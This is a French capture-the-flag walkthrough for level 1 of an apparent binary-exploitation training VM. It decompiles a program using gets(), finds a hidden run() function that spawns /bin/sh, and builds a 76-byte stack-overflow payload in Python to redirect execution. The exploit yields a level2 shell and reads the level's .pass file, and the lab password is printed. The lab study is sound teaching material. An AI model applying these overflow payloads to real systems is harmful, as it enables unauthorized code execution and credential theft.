# LEVEL 1
## Walkthrough

Voici les étapes suivit pour accéder au niveau supérieur, soit le `level2`. 

1. Une fois connecté à la VM sur le `level1`, l'on retrouve un fichier `level1` situé à la racine du dossier utilisateur. Ce dernier s'avère être de nouveau un exécutable ELF (Executable and Linkable Format).

2. On extrait ce fichier sur la machine host soit en utilisant la commande `scp` soit en utilisant un logiciel créer à cet effet.

    ```sh
    > scp -P 4242 level1@127.0.0.1:level1 /path/on/machine/host
    ```

2. On ouvre ensuite ce fichier dans Ghidra et après analyse, on obtient le désassemblage ci-dessous (que l'on refactorise pour plus de clarté).
    
	```sh
	#include <stdlib.h>
	#include <stdio.h>
	#include <string.h>
	#include <unistd.h>
	#include <sys/types.h>

	void run(void)
	{
		fwrite("Good... Wait what?\n",1,0x13,stdout);
		system("/bin/sh");
		return;
	}

	void main(void)
	{
		char local_50[76];

		gets(local_50);
		return;
	}
	```
	À partir de ce désassemblage, on en déduit que le programme contient 2 fonctions, la fonction `main` et la fonction `run` qui, tout deux, ne prennent aucun paramètre.
	
    La fonction `main` lit des entrées utilisateur dans `local_50` en utilisant la fonction `gets` tandis que la fonction `run` imprime `Good... Wait what?` sur la sortie standard, puis exécute `/bin/sh` avec la fonction `system`, ce qui démarre un shell interactif sur la machine. Cependant, l'on peut constater que la fonction `run` n'est pas appelé par la fonction `main`. Ainsi, il va falloir que l'on trouve un moyen d'appeler cette fonction afin de pouvoir accéder au shell interactif et pouvoir obtenir le mot de passe pour le niveau suivant.

3. Après quelques recherches, on apprend que la fonction `gets` possède une vulnérabilité : cette dernière ne possède pas d'un système de vérification de la taille des données entrées, ce qui signifie que l'utilisateur peut engendrer un buffer overflow. Ainsi, on devrait pouvoir utiliser la fonction `gets` dans le `main` afin de faire un `buffer overflow` (débordement) de la variable `local_50` et ainsi faire pointer la valeur de retour de `main` vers `run`. On sait que la fonction `main` stocke le resultat de `gets` dans une chaîne de `76` caractères. Ainsi, il faudra injecter une chaîne d'au moins `76` caractère dans la variable `local_50` pour qu'il y est `buffer overflow`.

    Lien : https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351

6. Maintenant, que l'on a un plan, l'on doit obtenir l'adresses mémoires de la fonction `run` pour la concaténer à notre chaîne de caractères qui nous servira pour effectuer notre `buffer overflow.` Ainsi, on lance l'exécutable via `gdb` et effectue un `disas` sur la fonction `main` ainsi qu'un `info function` pour obtenir les adresses mémoires des fonctions utilisé par l'exécutable.

    ```sh
    > gdb level1
    > disas main
    Dump of assembler code for function main:
		0x08048480 <+0>:	push   %ebp
		0x08048481 <+1>:	mov    %esp,%ebp
		0x08048483 <+3>:	and    $0xfffffff0,%esp
		0x08048486 <+6>:	sub    $0x50,%esp
		0x08048489 <+9>:	lea    0x10(%esp),%eax
		0x0804848d <+13>:	mov    %eax,(%esp)
		0x08048490 <+16>:	call   0x8048340 <gets@plt>
		0x08048495 <+21>:	leave
		0x08048496 <+22>:	ret
	End of assembler dump.
	> info function
	[...]
		0x08048444  run
		0x08048480  main
	[...]
    ```
    Ainsi, on obtient l'adresse `0x08048444` pour la fonction `run`.

6. Maintenant, l'on doit donc injecter dans `local_50`, en utilisant le `gets`, un payload de 76 de long suivi de l'adresse de `run` (l'adresse doit être en format `little endian`). On utilise python pour générer le payload.
   
	```sh
	> python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/payload1
	```
	
	Lien : https://dicom.nema.org/medical/dicom/current/output/chtml/part05/sect_7.3.html#:~:text=Little%20Endian%20byte%20ordering%20is,in%20increasing%20order%20of%20significance.

9. Une fois le payload généré, on peut l'injecter dans `./level01` via un `cat -` (le tiret permet de garder le `cat` ouvert et de pouvoir écrire ce qu'on veut dedans). À partir de là, on lance la commande `whoami` pour s'assurer que l'utilisateur a bien changé de `level1` à `level2` et on `cat` le fichier `/home/user/level2/.pass` pour obtenir le mot de passe qui nous permettra d'accéder au niveau suivant.
    
	```sh
	> cat /tmp/payload1 - | ./level1
	> whoami
	level2
	> cat /home/user/level2/.pass
	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
	```

10. On peut à présent passer au niveau supérieur en exécutant la commande `su level2` et en y spécifiant le mot de passe qui vient d'être trouvée. 
    
	```sh
    > su level2
    Password :
	> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
    ```